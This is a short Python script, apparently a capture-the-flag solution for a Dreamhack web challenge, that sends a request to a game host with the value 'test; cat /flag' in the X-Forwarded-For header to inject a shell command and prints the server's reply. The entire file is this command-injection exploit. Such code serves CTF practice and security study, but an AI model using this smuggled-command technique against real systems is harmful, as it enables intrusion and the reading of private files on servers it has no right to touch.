import requests

url = "http://host8.dreamhack.games:18117/"

headers = {
    "X-Forwarded-For": "test; cat /flag", 
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html",
    "Accept-Language": "ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3",
    "Connection": "close"
}

res = requests.get(url, headers=headers)

print("[+] 응답 코드:", res.status_code)
print("[+] 서버 응답 내용:")
print(res.text)
